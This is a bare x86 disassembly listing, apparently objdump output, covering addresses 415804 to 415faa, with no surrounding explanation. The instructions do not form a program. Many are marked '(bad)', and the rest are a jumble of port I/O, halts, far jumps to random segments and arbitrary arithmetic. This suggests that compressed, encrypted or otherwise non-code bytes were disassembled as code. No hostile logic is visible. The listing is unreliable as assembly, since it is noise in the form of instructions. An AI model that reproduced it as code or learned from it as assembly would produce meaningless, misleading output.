  415804:	lods   eax,DWORD PTR ds:[esi]
  415805:	mov    dh,0xb4
  415807:	dec    esi
  415808:	(bad)  [ecx+0x6ca09a52]
  41580e:	test   al,0xe3
  415810:	dec    eax
  415811:	jno    0x41585a
  415813:	(bad)  
  415814:	int    0x1f
  415816:	push   ecx
  415817:	inc    ebx
  415818:	fs pop edx
  41581a:	(bad)  
  41581b:	leave  
  41581c:	push   ss
  41581d:	ret    0x863f
  415820:	(bad)  
  415821:	mov    BYTE PTR [eax],ch
  415823:	lock or eax,0x900929fd
  415829:	sub    eax,0x29eeeeab
  41582e:	dec    edi
  41582f:	bound  ebx,QWORD PTR [eax]
  415831:	sbb    ecx,DWORD PTR [edi+ecx*2]
  415834:	(bad)  [ebx+0x7077ea3f]
  41583a:	xchg   ebx,eax
  41583b:	and    ecx,DWORD PTR [esi]
  41583d:	ja     0x415809
  41583f:	fidivr DWORD PTR [ebx]
  415841:	dec    edi
  415842:	push   es
  415843:	jnp    0x415885
  415845:	and    DWORD PTR [edx-0x7754cf63],esi
  41584b:	loope  0x415889
  41584d:	or     ah,BYTE PTR [esi-0xc5c5840]
  415853:	sbb    dh,BYTE PTR [ebx+0x107ef42e]
  415859:	pop    ebx
  41585a:	data16 shr BYTE PTR [edx+0x2237468f],0x93
  415862:	dec    esi
  415863:	or     BYTE PTR [esi+eax*2-0x382fa039],0xe8
  41586b:	outs   dx,DWORD PTR ds:[esi]
  41586c:	imul   esp,DWORD PTR [esi+0x68f6928],0x589f5da8
  415876:	(bad)  
  415877:	add    ecx,ebp
  415879:	push   es
  41587a:	inc    ecx
  41587b:	inc    ecx
  41587c:	cmp    eax,0x93f87647
  415881:	mov    bh,0x60
  415883:	add    BYTE PTR [edi-0x30df94dc],ch
  415889:	sub    esp,esi
  41588b:	fwait
  41588c:	rol    BYTE PTR [ecx+0x4],0x2e
  415890:	pop    ecx
  415891:	jnp    0x41586b
  415893:	xchg   ebp,eax
  415894:	stos   BYTE PTR es:[edi],al
  415895:	je     0x41589c
  415897:	mov    ah,0x92
  415899:	es pop edi
  41589b:	cwde   
  41589c:	pop    ds
  41589d:	jl     0x41590e
  41589f:	pop    edi
  4158a0:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4158a2:	inc    eax
  4158a3:	outs   dx,DWORD PTR ds:[esi]
  4158a4:	mov    al,0x5e
  4158a6:	imul   ebp,eax,0x8bdf86c8
  4158ac:	sar    DWORD PTR [esi-0x75],1
  4158af:	mov    esp,DWORD PTR [edi+eax*8-0x21fde2d7]
  4158b6:	pop    eax
  4158b7:	xchg   esp,eax
  4158b8:	test   DWORD PTR [ecx],ebx
  4158ba:	mov    edi,DWORD PTR [eax]
  4158bc:	inc    ecx
  4158bd:	cmc    
  4158be:	and    DWORD PTR [ebp+0x14782f],0xffffffcd
  4158c5:	cmp    BYTE PTR [esp+eax*2-0x46],0x1
  4158ca:	jne    0x4158cd
  4158cc:	push   edx
  4158cd:	add    al,0x8e
  4158cf:	pushfw 
  4158d1:	pop    esp
  4158d2:	push   esi
  4158d3:	add    DWORD PTR [ebp-0x61],edx
  4158d6:	mov    ds:0x75a7f112,al
  4158db:	mov    ah,0x6b
  4158dd:	sub    DWORD PTR [edx],edi
  4158df:	retf   
  4158e0:	pop    es
  4158e1:	adc    esi,eax
  4158e3:	popa   
  4158e4:	popf   
  4158e5:	mov    esp,0x602c9762
  4158ea:	mov    ebp,DWORD PTR [edx-0x3e]
  4158ed:	jae    0x41591e
  4158ef:	test   eax,0xe122cd36
  4158f4:	xchg   edx,eax
  4158f5:	inc    edi
  4158f6:	and    DWORD PTR [ebx+0x70],0xf8f76a69
  4158fd:	fld    DWORD PTR [ecx+0x1a]
  415900:	adc    DWORD PTR [ecx-0xa],esp
  415903:	out    0xe1,al
  415905:	mov    ds:0xe5e942a,al
  41590a:	mov    ecx,0x878409
  41590f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415910:	fld    st(6)
  415912:	clc    
  415913:	loop   0x4158eb
  415915:	sub    BYTE PTR [ebx],cl
  415917:	mov    al,0xd7
  415919:	call   0xfee2:0xf9460f7c
  415920:	fst    QWORD PTR [edi]
  415922:	adc    al,0x6b
  415924:	lods   al,BYTE PTR ds:[esi]
  415925:	or     eax,ebx
  415927:	test   eax,0xf74c4e9a
  41592c:	inc    edx
  41592d:	jo     0x415978
  41592f:	lds    edi,FWORD PTR [ecx]
  415931:	int3   
  415932:	out    dx,eax
  415933:	in     al,dx
  415934:	mov    al,bh
  415936:	sbb    BYTE PTR [esi+0x5224e7],ch
  41593c:	popa   
  41593d:	outs   dx,BYTE PTR ds:[esi]
  41593e:	outs   dx,DWORD PTR ds:[esi]
  41593f:	fdiv   QWORD PTR [edx-0x1b174c02]
  415945:	dec    ebp
  415946:	inc    esp
  415947:	dec    ebx
  415948:	sbb    eax,0xef10d0cc
  41594d:	add    al,0xdc
  41594f:	outs   dx,DWORD PTR ds:[esi]
  415950:	push   ss
  415951:	sub    DWORD PTR [ecx+0x7e],ecx
  415954:	outs   dx,DWORD PTR ds:[esi]
  415955:	into   
  415956:	retf   0x3e1a
  415959:	rcl    BYTE PTR [ebx],cl
  41595b:	pop    ebx
  41595c:	jo     0x415947
  41595e:	into   
  41595f:	inc    ebp
  415960:	out    0x67,eax
  415962:	ret    
  415963:	or     esp,eax
  415965:	idiv   BYTE PTR ss:[eax]
  415968:	(bad)  [edi-0x25]
  41596b:	inc    esp
  41596c:	scas   eax,DWORD PTR es:[edi]
  41596d:	sub    DWORD PTR [eax-0x1b49e0d8],0xfcf63c61
  415977:	inc    edx
  415978:	mov    ecx,0xa1343c71
  41597d:	clc    
  41597e:	jle    0x41596e
  415980:	and    esi,DWORD PTR [edx+0x2b]
  415983:	stos   DWORD PTR es:[edi],eax
  415984:	out    dx,eax
  415985:	rol    BYTE PTR [esi+0x12348708],1
  41598b:	(bad)  
  41598c:	push   esp
  41598d:	popf   
  41598e:	inc    edi
  41598f:	in     al,0x33
  415991:	push   ebx
  415992:	add    BYTE PTR [ebp+esi*1-0x6a],cl
  415996:	xchg   ebx,esi
  415998:	fimul  DWORD PTR [ebx+0x3085a00a]
  41599e:	mov    ds,ecx
  4159a0:	sub    ebx,edx
  4159a2:	mov    ds:0xcec0657d,al
  4159a7:	(bad)  
  4159a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159a9:	dec    edx
  4159aa:	call   FWORD PTR [eax+ecx*1]
  4159ad:	mov    WORD PTR ds:0x993aba81,?
  4159b3:	xchg   ebx,eax
  4159b4:	add    DWORD PTR [ebx-0x13fc1919],esi
  4159ba:	lods   eax,DWORD PTR ds:[esi]
  4159bb:	or     DWORD PTR [ecx],edi
  4159bd:	add    al,al
  4159bf:	jbe    0x4159c9
  4159c1:	popa   
  4159c2:	aam    0x23
  4159c4:	outs   dx,BYTE PTR ds:[esi]
  4159c5:	pushf  
  4159c6:	mul    BYTE PTR [esi-0x7c]
  4159c9:	and    edi,edx
  4159cb:	ficomp DWORD PTR [edx]
  4159cd:	pushf  
  4159ce:	sbb    DWORD PTR [esi+0x12],esi
  4159d1:	stc    
  4159d2:	cdq    
  4159d3:	xor    cl,ah
  4159d5:	xor    dl,dh
  4159d7:	daa    
  4159d8:	cmp    BYTE PTR [edx-0x48],al
  4159db:	mov    ecx,0x58557931
  4159e0:	mov    ds:0x4c9ac3c2,eax
  4159e5:	mov    edx,0xce6ecd84
  4159ea:	jp     0x4159fb
  4159ec:	push   ecx
  4159ed:	dec    ebp
  4159ee:	sub    DWORD PTR [edi-0x10],esp
  4159f1:	sbb    BYTE PTR [ecx-0x35f6cdea],al
  4159f7:	pushf  
  4159f8:	scas   eax,DWORD PTR es:[edi]
  4159f9:	lea    ebx,[eax]
  4159fb:	(bad)  
  4159fc:	push   0xbd1b8fb0
  415a01:	and    eax,0xbcb18a80
  415a06:	inc    edi
  415a07:	es mov ecx,0x8d19cce5
  415a0d:	clc    
  415a0e:	xor    bl,BYTE PTR [esi-0x33]
  415a11:	into   
  415a12:	call   0x4623:0xea3cf34f
  415a19:	jnp    0x4159fc
  415a1b:	jle    0x415a39
  415a1d:	adc    eax,0x4d220b5e
  415a22:	push   ebp
  415a23:	mov    ds:0xe224bab8,al
  415a28:	push   edi
  415a29:	aas    
  415a2a:	push   cs
  415a2b:	shl    BYTE PTR [edx-0x5a],1
  415a2e:	pop    ebx
  415a2f:	jbe    0x415a18
  415a31:	xor    eax,0xecefcb7b
  415a36:	jp     0x415a4c
  415a38:	mov    edx,DWORD PTR [edi-0x3fda411e]
  415a3e:	mov    ebp,0xad38826c
  415a43:	push   cs
  415a44:	in     eax,dx
  415a45:	hlt    
  415a46:	fcmove st,st(2)
  415a48:	jmp    0xf2ff:0x2ab1abb
  415a4f:	(bad)  
  415a51:	rcl    BYTE PTR [ecx+0x12],cl
  415a54:	aam    0xd5
  415a56:	push   ebx
  415a57:	iret   
  415a58:	enter  0xee56,0x27
  415a5c:	add    eax,edx
  415a5e:	(bad)  
  415a5f:	loop   0x415a60
  415a61:	jle    0x4159e8
  415a63:	nop
  415a64:	stos   BYTE PTR es:[edi],al
  415a65:	xor    cl,BYTE PTR [eax]
  415a67:	shr    DWORD PTR [edi-0x3c],cl
  415a6a:	aaa    
  415a6b:	adc    esi,ebx
  415a6d:	icebp  
  415a6e:	jmp    0x415ae5
  415a70:	jp     0x415a49
  415a72:	jo     0x415a7f
  415a74:	xchg   edx,eax
  415a75:	outs   dx,BYTE PTR ds:[esi]
  415a76:	lea    esp,[ebx+0x5a]
  415a79:	ja     0x415a3a
  415a7b:	fld    DWORD PTR [ecx+0x6]
  415a7e:	ja     0x415a29
  415a80:	or     BYTE PTR ds:0x41637232,ah
  415a86:	add    edi,DWORD PTR [eax-0xeab4a59]
  415a8c:	dec    eax
  415a8d:	mul    DWORD PTR [esi]
  415a8f:	out    dx,eax
  415a90:	clc    
  415a91:	mov    BYTE PTR [ecx],ch
  415a93:	pop    eax
  415a94:	lds    ebx,FWORD PTR [ecx-0x37727005]
  415a9a:	push   esi
  415a9b:	mov    eax,0xb852a9d
  415aa0:	lds    edi,FWORD PTR [eax+ecx*8]
  415aa3:	dec    esp
  415aa4:	aad    0x4d
  415aa6:	call   0x8b8f4f90
  415aab:	mov    ch,BYTE PTR [eax]
  415aad:	aas    
  415aae:	or     DWORD PTR [ebp-0x607424f0],ebx
  415ab4:	repnz sbb BYTE PTR [edi-0x51],0xea
  415ab9:	call   0x80c3c90f
  415abe:	or     bl,BYTE PTR [eax-0x29]
  415ac1:	test   DWORD PTR [ecx],esp
  415ac3:	dec    edi
  415ac4:	(bad)  
  415ac5:	and    dl,BYTE PTR [edx+edi*1]
  415ac8:	(bad)  
  415ac9:	lahf   
  415aca:	inc    ecx
  415acb:	cmp    DWORD PTR [edx+0x69366b36],0xffffff84
  415ad2:	jl     0x415a82
  415ad4:	jb     0x415a73
  415ad6:	mov    al,0xdb
  415ad8:	pop    ebx
  415ad9:	xchg   ebp,eax
  415ada:	jmp    0x4657:0xfef6cee6
  415ae1:	sar    BYTE PTR ds:0x31f8cf7a,cl
  415ae7:	fidiv  WORD PTR [edx+edi*2-0x7f573b6a]
  415aee:	cmp    edi,esi
  415af0:	mov    al,0xd1
  415af2:	in     eax,dx
  415af3:	sbb    DWORD PTR [esi],esp
  415af5:	pop    edx
  415af6:	daa    
  415af7:	sar    edi,1
  415af9:	sbb    eax,0x7cc2b5e2
  415afe:	stos   DWORD PTR es:[edi],eax
  415aff:	enter  0x8503,0x98
  415b03:	mov    esp,ecx
  415b05:	add    al,0x3d
  415b07:	and    eax,0x63dd7dd8
  415b0c:	retf   0x632f
  415b0f:	dec    ebp
  415b10:	mov    ch,0x50
  415b12:	aas    
  415b13:	imul   BYTE PTR [ebp-0x312324fa]
  415b19:	cmp    dl,BYTE PTR [ecx-0x73c5e811]
  415b1f:	retf   
  415b20:	or     al,0x6f
  415b22:	xchg   edx,eax
  415b23:	lea    edx,[ebx-0x48520fe9]
  415b29:	mov    cl,0x74
  415b2b:	pop    es
  415b2c:	adc    al,0x6f
  415b2e:	or     DWORD PTR [eax+0x5c],edx
  415b31:	shl    ah,cl
  415b33:	jno    0x415bb3
  415b35:	push   0x7fce3092
  415b3a:	sbb    eax,0xf2d25729
  415b3f:	ins    DWORD PTR es:[edi],dx
  415b40:	cmp    eax,0x18200727
  415b45:	iret   
  415b46:	loop   0x415b63
  415b48:	mov    ecx,0x2f8c2a27
  415b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b4e:	out    dx,eax
  415b4f:	jmp    0x2e73fc78
  415b54:	neg    BYTE PTR [ecx-0x56]
  415b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b58:	bound  edi,QWORD PTR [esi+0x45e0df91]
  415b5e:	pop    edi
  415b5f:	add    eax,0x4698fd97
  415b64:	mov    dh,0x1d
  415b66:	loopne 0x415afe
  415b68:	dec    eax
  415b69:	cmc    
  415b6a:	push   edi
  415b6b:	sub    DWORD PTR [edx],edx
  415b6d:	xlat   BYTE PTR ds:[ebx]
  415b6e:	aad    0xc5
  415b70:	mov    edi,DWORD PTR [ebx+edi*4-0x45a12187]
  415b77:	iret   
  415b78:	jbe    0x415b11
  415b7a:	cwde   
  415b7b:	js     0x415bb5
  415b7d:	loopne 0x415b5f
  415b7f:	fst    QWORD PTR [ebp-0x2000b6d6]
  415b85:	xor    eax,0x54afde5d
  415b8a:	test   DWORD PTR [esi+0x6a3b2948],edx
  415b90:	pop    esi
  415b91:	cld    
  415b92:	inc    esp
  415b93:	out    0xf8,eax
  415b95:	out    0x6c,eax
  415b97:	stos   DWORD PTR es:[edi],eax
  415b98:	mov    edx,0xa1175f07
  415b9d:	cld    
  415b9e:	push   cs
  415b9f:	pop    es
  415ba0:	push   ss
  415ba1:	scas   eax,DWORD PTR es:[edi]
  415ba2:	call   0x4ffa60ca
  415ba7:	rcl    BYTE PTR [edx],0x4c
  415baa:	push   0x34
  415bac:	sub    ch,dh
  415bae:	loopne 0x415b81
  415bb0:	and    eax,edx
  415bb2:	cdq    
  415bb3:	stos   BYTE PTR es:[edi],al
  415bb4:	push   ebp
  415bb5:	xchg   BYTE PTR [ebp-0x34e07fdd],bh
  415bbb:	in     eax,0xec
  415bbd:	stos   DWORD PTR es:[edi],eax
  415bbe:	push   edi
  415bbf:	mov    ecx,0xa475d8a2
  415bc4:	push   ebp
  415bc5:	mov    ds:0x35607f64,eax
  415bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bcb:	sar    BYTE PTR [ebx-0x73d57edc],0x39
  415bd2:	sbb    BYTE PTR [eax],ah
  415bd4:	repz cmp DWORD PTR [edx+0x29],eax
  415bd8:	aaa    
  415bd9:	ss sub eax,0x28f49149
  415bdf:	int    0xf4
  415be1:	jbe    0x415bb0
  415be3:	jle    0x415c3a
  415be5:	mov    ecx,0xb0144d46
  415bea:	loopne 0x415c50
  415bec:	adc    BYTE PTR [esi-0x1564ad4a],0xd3
  415bf3:	xor    dh,0x2b
  415bf6:	hlt    
  415bf7:	jecxz  0x415b9d
  415bf9:	cmp    edi,DWORD PTR [edi]
  415bfb:	cmp    bl,BYTE PTR [eax]
  415bfd:	jge    0x415c40
  415bff:	fsubr  st,st(7)
  415c01:	push   es
  415c02:	and    bl,BYTE PTR [esp+edi*1]
  415c05:	and    eax,0xe162cfb1
  415c0a:	nop
  415c0b:	push   0x572161a0
  415c10:	and    BYTE PTR [ebx-0x43],0x14
  415c14:	xchg   ecx,eax
  415c15:	dec    ebp
  415c16:	push   esp
  415c17:	mov    ebp,ecx
  415c19:	sbb    BYTE PTR [ebp+0x738044ac],ah
  415c1f:	pushf  
  415c20:	in     al,dx
  415c21:	into   
  415c22:	in     eax,0xdd
  415c24:	lock retf 
  415c26:	add    BYTE PTR [eax-0x2a73474b],cl
  415c2c:	xor    cl,BYTE PTR [ecx]
  415c2e:	cli    
  415c2f:	adc    eax,0xbe55e86b
  415c34:	(bad)  
  415c35:	outs   dx,DWORD PTR ds:[esi]
  415c36:	loope  0x415bc3
  415c38:	repnz (bad) 
  415c3b:	pushf  
  415c3c:	sbb    BYTE PTR [edi-0x40],ah
  415c3f:	int    0x5b
  415c41:	repz mov cl,0x1a
  415c44:	sub    BYTE PTR [edx],al
  415c46:	or     eax,0x37be9227
  415c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c4c:	jb     0x415c5c
  415c4e:	adc    eax,0x427afdb
  415c53:	enter  0x4849,0x6c
  415c57:	call   0x86247f17
  415c5c:	lahf   
  415c5d:	cwd    
  415c5f:	dec    esp
  415c60:	or     eax,0x2cda035c
  415c65:	(bad)  
  415c67:	push   eax
  415c68:	ins    BYTE PTR es:[edi],dx
  415c69:	lahf   
  415c6a:	lock lahf 
  415c6c:	add    esi,ecx
  415c6e:	pusha  
  415c6f:	arpl   WORD PTR [eax-0x15d56069],ax
  415c75:	daa    
  415c76:	sub    al,0xcb
  415c78:	dec    ebx
  415c79:	fdiv   st(7),st
  415c7b:	jg     0x415c24
  415c7d:	in     eax,0x53
  415c7f:	shr    BYTE PTR [esi-0x56],cl
  415c82:	adc    bl,ah
  415c84:	arpl   bx,di
  415c86:	push   eax
  415c87:	inc    esp
  415c88:	adc    edi,DWORD PTR [ecx+0x7d]
  415c8b:	mov    ds:0xcc059ccf,eax
  415c90:	imul   ebp,ecx,0xffffff81
  415c93:	mov    ah,0x17
  415c95:	mov    al,ds:0xbba9a960
  415c9a:	adc    eax,DWORD PTR [edx-0x225f68cb]
  415ca0:	ja     0x415c90
  415ca2:	sbb    eax,0x40fae5a5
  415ca7:	int    0xfe
  415ca9:	cmp    dh,BYTE PTR [ecx]
  415cab:	sar    DWORD PTR [ecx],0x5a
  415cae:	(bad)  
  415caf:	lods   eax,DWORD PTR ds:[esi]
  415cb0:	(bad)  
  415cb2:	cmp    esi,eax
  415cb4:	adc    bl,dl
  415cb6:	xor    eax,0xac84c49
  415cbb:	add    eax,0xcc774db6
  415cc0:	popf   
  415cc1:	xchg   ebp,eax
  415cc2:	jno    0x415d08
  415cc4:	fadd   DWORD PTR [edi]
  415cc6:	sub    ebp,DWORD PTR [eax-0xf]
  415cc9:	mov    ds:0xd1aacfab,al
  415cce:	inc    edx
  415ccf:	ja     0x415c9f
  415cd1:	mov    eax,cs
  415cd3:	jmp    edx
  415cd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cd6:	push   0xffffff9f
  415cd8:	jnp    0x415d0c
  415cda:	scas   eax,DWORD PTR es:[edi]
  415cdb:	mov    bh,0x9f
  415cdd:	in     al,0x72
  415cdf:	push   eax
  415ce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ce1:	jo     0x415d2d
  415ce3:	jb     0x415cc9
  415ce5:	jb     0x415ce4
  415ce7:	jae    0x415ca1
  415ce9:	jbe    0x415c80
  415ceb:	aad    0xfd
  415ced:	push   ebx
  415cee:	mov    DWORD PTR [esi+ebp*2+0x5d],ebp
  415cf2:	adc    bh,BYTE PTR [ebp-0x6e]
  415cf5:	add    al,0x61
  415cf7:	and    BYTE PTR [ebp+0x12],ch
  415cfa:	pop    ds
  415cfb:	push   esi
  415cfc:	out    dx,al
  415cfd:	retf   0x6b4
  415d00:	mov    dh,ch
  415d02:	add    dh,BYTE PTR [edi+0x6b01ccbc]
  415d08:	out    0xaa,eax
  415d0a:	or     esp,edi
  415d0c:	imul   ebx,DWORD PTR [eax+0x70],0xa33a9e6
  415d13:	jecxz  0x415d2d
  415d15:	out    0x23,al
  415d17:	out    0x72,eax
  415d19:	jb     0x415d88
  415d1b:	jae    0x415d54
  415d1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d1e:	push   esp
  415d1f:	and    eax,0xf52c8785
  415d24:	push   esp
  415d25:	push   es
  415d26:	pop    es
  415d27:	iret   
  415d28:	push   ecx
  415d29:	out    dx,al
  415d2a:	hlt    
  415d2b:	sub    eax,0xc2a9ec6d
  415d30:	dec    ebx
  415d31:	mov    esp,esp
  415d33:	int3   
  415d34:	in     eax,0x56
  415d36:	scas   al,BYTE PTR es:[edi]
  415d37:	nop
  415d38:	adc    dh,BYTE PTR [esp+eiz*8-0x2ff88379]
  415d3f:	test   eax,0xdb734bf9
  415d44:	pop    ds
  415d45:	in     eax,dx
  415d46:	mov    bh,0x6c
  415d48:	loope  0x415cef
  415d4a:	pop    ss
  415d4b:	(bad)  
  415d4c:	rcr    BYTE PTR [edx-0x38],0x9a
  415d50:	pusha  
  415d51:	pushf  
  415d52:	cdq    
  415d53:	sub    BYTE PTR [ebp+0x58711c51],bl
  415d59:	lods   al,BYTE PTR ds:[esi]
  415d5a:	hlt    
  415d5b:	jg     0x415d40
  415d5d:	push   esi
  415d5e:	ds (bad) 
  415d61:	or     ch,BYTE PTR [esi-0x7d]
  415d64:	pop    es
  415d65:	(bad)  
  415d66:	mov    DWORD PTR [ebp-0x66],ecx
  415d69:	mov    ah,0x95
  415d6b:	dec    esp
  415d6c:	hlt    
  415d6d:	into   
  415d6e:	xor    DWORD PTR [eax],eax
  415d70:	popa   
  415d71:	mov    esp,edx
  415d73:	lahf   
  415d74:	cwde   
  415d75:	(bad)  
  415d77:	cmp    bh,0x86
  415d7a:	sub    DWORD PTR [ebp+0x6f],ebp
  415d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d7e:	xchg   dh,ah
  415d80:	or     ch,BYTE PTR [esi+0x22]
  415d83:	mov    ebp,0xc4309290
  415d88:	mov    bh,0xea
  415d8a:	out    dx,al
  415d8b:	(bad)  
  415d8d:	scas   eax,DWORD PTR es:[edi]
  415d8e:	(bad)  
  415d8f:	outs   dx,DWORD PTR ds:[esi]
  415d90:	and    al,0x2f
  415d92:	out    dx,eax
  415d93:	xchg   ebp,eax
  415d94:	push   ebx
  415d95:	ins    DWORD PTR es:[edi],dx
  415d96:	adc    BYTE PTR [edi+0x7d],al
  415d99:	enter  0xc2b2,0x49
  415d9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d9e:	mov    ecx,ds
  415da0:	jns    0x415dc6
  415da2:	mov    al,0x1e
  415da4:	adc    al,0xc0
  415da6:	lods   eax,DWORD PTR ds:[esi]
  415da7:	mov    edi,0x62f37cd8
  415dac:	out    0xa4,al
  415dae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415daf:	mov    eax,0x4d254f7
  415db4:	repz enter 0x73b3,0xd8
  415db9:	cld    
  415dba:	daa    
  415dbb:	fidiv  DWORD PTR [edx+0x64]
  415dbe:	add    BYTE PTR [ecx],bl
  415dc0:	mov    al,0xce
  415dc2:	aam    0x1
  415dc4:	jl     0x415e1a
  415dc6:	ja     0x415d61
  415dc8:	inc    ebx
  415dc9:	mov    ah,0xe1
  415dcb:	jmp    0xa2c72fd6
  415dd0:	sahf   
  415dd1:	arpl   WORD PTR [edi+0x171f8216],di
  415dd7:	inc    esp
  415dd8:	loopne 0x415e2a
  415dda:	pop    ebx
  415ddb:	push   cs
  415ddc:	lock outs dx,BYTE PTR ds:[esi]
  415dde:	lods   eax,DWORD PTR ds:[esi]
  415ddf:	nop
  415de0:	push   0xffffffee
  415de2:	sbb    al,0x2
  415de4:	jmp    0x5b9e:0x8875f886
  415deb:	cmp    DWORD PTR [esi+0x5533a6d0],edi
  415df1:	adc    al,0xe5
  415df3:	mov    al,0x7
  415df5:	mov    edx,0x554b3016
  415dfa:	mov    DWORD PTR [edx+ecx*1+0x5c3c241f],0xb930c876
  415e05:	or     ebx,esi
  415e07:	mov    ah,0x33
  415e09:	mov    dl,0xb6
  415e0b:	dec    ecx
  415e0c:	mov    esp,0x1cadff8b
  415e11:	jae    0x415e37
  415e13:	(bad)  
  415e15:	stos   DWORD PTR es:[edi],eax
  415e16:	aam    0x28
  415e18:	sbb    BYTE PTR [ecx],ch
  415e1a:	aas    
  415e1b:	imul   ebx,DWORD PTR [ecx-0x19],0xffffffb0
  415e1f:	sub    DWORD PTR [ecx-0x6681c458],esp
  415e25:	jmp    0x415de2
  415e27:	xchg   DWORD PTR [ebx],esp
  415e29:	mov    BYTE PTR [esp+esi*4],ch
  415e2c:	dec    ebp
  415e2d:	cmp    bh,BYTE PTR [edi+0xf]
  415e30:	pop    ds
  415e31:	(bad)  
  415e32:	sub    eax,0x158ffe14
  415e37:	test   DWORD PTR [ecx-0x2275d4bd],esp
  415e3d:	jecxz  0x415dc1
  415e3f:	(bad)  
  415e41:	pop    edi
  415e42:	add    al,0x10
  415e44:	call   0x8df2:0x4f20252f
  415e4b:	xlat   BYTE PTR ss:[ebx]
  415e4d:	imul   edi,DWORD PTR [eax+0x42],0xe05d626a
  415e54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e55:	shl    DWORD PTR [edi],1
  415e57:	test   eax,0xe543eeaf
  415e5c:	sbb    eax,0xc0f9d280
  415e61:	xchg   ebx,eax
  415e62:	jmp    0x40ba:0x15f5275b
  415e69:	pop    edx
  415e6a:	jne    0x415df3
  415e6c:	fwait
  415e6d:	pop    esp
  415e6e:	or     bh,BYTE PTR ds:0x25299707
  415e74:	ins    BYTE PTR es:[edi],dx
  415e75:	mov    ah,0xca
  415e77:	sub    al,BYTE PTR [edx+0x7a]
  415e7a:	int3   
  415e7b:	adc    al,0xa4
  415e7d:	mov    al,ds:0x80d68e2d
  415e82:	pop    edi
  415e83:	add    al,0xb5
  415e85:	and    ch,BYTE PTR [ebp+ecx*4-0x79653380]
  415e8c:	imul   ebx,DWORD PTR [ecx+0x3431db07],0xb3dfa35d
  415e96:	(bad)  
  415e97:	or     BYTE PTR [ebx-0x72482568],bh
  415e9d:	inc    edx
  415e9e:	nop
  415e9f:	in     eax,dx
  415ea0:	call   0x7a65a768
  415ea5:	sbb    ch,ch
  415ea7:	dec    esi
  415ea8:	or     al,bl
  415eaa:	test   eax,0x1078f8c9
  415eaf:	or     ecx,DWORD PTR [ecx]
  415eb1:	fchs   
  415eb3:	shl    BYTE PTR [edx],cl
  415eb5:	adc    edi,DWORD PTR [ebp-0x64]
  415eb8:	sbb    edx,DWORD PTR [ebp-0x6a73fee4]
  415ebe:	adc    dl,dl
  415ec0:	cli    
  415ec1:	(bad)  
  415ec3:	jns    0x415f3d
  415ec5:	dec    esp
  415ec6:	leave  
  415ec7:	(bad)  
  415ec8:	and    eax,0xc3355d4e
  415ecd:	leave  
  415ece:	mov    edi,DWORD PTR [ebp+0x4]
  415ed1:	cmp    al,0x83
  415ed3:	inc    eax
  415ed5:	fiadd  WORD PTR [esp+eiz*4]
  415ed8:	mov    ds:0x37b76f47,al
  415edd:	je     0x415f1e
  415edf:	test   eax,edx
  415ee1:	cmc    
  415ee2:	push   esi
  415ee3:	mov    ebx,0xebbf2c43
  415ee8:	adc    eax,0x8cf89f40
  415eed:	outs   dx,BYTE PTR ds:[esi]
  415eee:	push   ds
  415eef:	add    bl,cl
  415ef1:	mov    ?,esp
  415ef3:	jmp    0xc1e6:0xbc0c64cb
  415efa:	inc    edx
  415efb:	push   edx
  415efc:	cwde   
  415efd:	aas    
  415efe:	in     eax,0x20
  415f00:	ja     0x415e9d
  415f02:	push   esi
  415f03:	ins    DWORD PTR es:[edi],dx
  415f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f05:	xchg   esp,eax
  415f06:	inc    ecx
  415f07:	fimul  DWORD PTR [edx+edi*8-0x58]
  415f0b:	adc    eax,0xc76d32fa
  415f10:	int3   
  415f11:	dec    esp
  415f12:	shr    DWORD PTR [esi],cl
  415f14:	or     eax,0xf6e3cf4b
  415f19:	data16 xlat BYTE PTR ds:[ebx]
  415f1b:	add    ch,BYTE PTR [eax]
  415f1d:	ret    0x6027
  415f20:	mov    ch,0x47
  415f22:	mov    ax,ds:0xac2dcb29
  415f28:	push   ebp
  415f29:	push   0x600356b2
  415f2e:	lods   eax,DWORD PTR ds:[esi]
  415f2f:	mov    al,ds:0xc4de0fcc
  415f34:	sti    
  415f35:	push   esp
  415f36:	sub    esp,ecx
  415f38:	pop    edi
  415f39:	jg     0x415f36
  415f3b:	out    0xbb,al
  415f3d:	pop    eax
  415f3e:	mov    al,0xfd
  415f40:	push   0x54
  415f42:	sbb    al,0xaf
  415f44:	mov    BYTE PTR [ecx+0x35ee4d0],0x4f
  415f4b:	enter  0xb2ab,0xb9
  415f4f:	jmp    0x2729:0x3a0f0e10
  415f56:	ja     0x415ed8
  415f58:	fidivr DWORD PTR [ebx]
  415f5a:	daa    
  415f5b:	jmp    0xf4d30483
  415f60:	ja     0x415f7e
  415f62:	nop
  415f63:	ss mov edi,0x7285cd9d
  415f69:	nop    DWORD PTR [esi-0xedea4bf]
  415f70:	adc    BYTE PTR [esi-0x71],0x72
  415f74:	mov    dl,0x6d
  415f76:	sub    edx,ebx
  415f78:	pop    eax
  415f79:	in     eax,dx
  415f7a:	mov    ecx,0x1ae5fdda
  415f7f:	test   eax,0xbe5e729e
  415f84:	loope  0x415ff1
  415f86:	sub    edx,DWORD PTR [esi]
  415f88:	pop    eax
  415f89:	test   al,0xba
  415f8b:	push   esp
  415f8c:	pushf  
  415f8d:	int3   
  415f8e:	push   0x8dbbd92a
  415f93:	mov    esi,ecx
  415f95:	ret    0xe613
  415f98:	mov    ah,BYTE PTR [eax+ecx*8+0x2b]
  415f9c:	cmp    edi,ebx
  415f9e:	ins    BYTE PTR es:[edi],dx
  415f9f:	mov    ebx,0xf227ea58
  415fa4:	mov    eax,ebx
  415fa6:	std    
  415fa7:	or     dl,BYTE PTR [eax+0x62]
  415faa:	adc    dl,BYTE PTR [esi+0x367cc454]
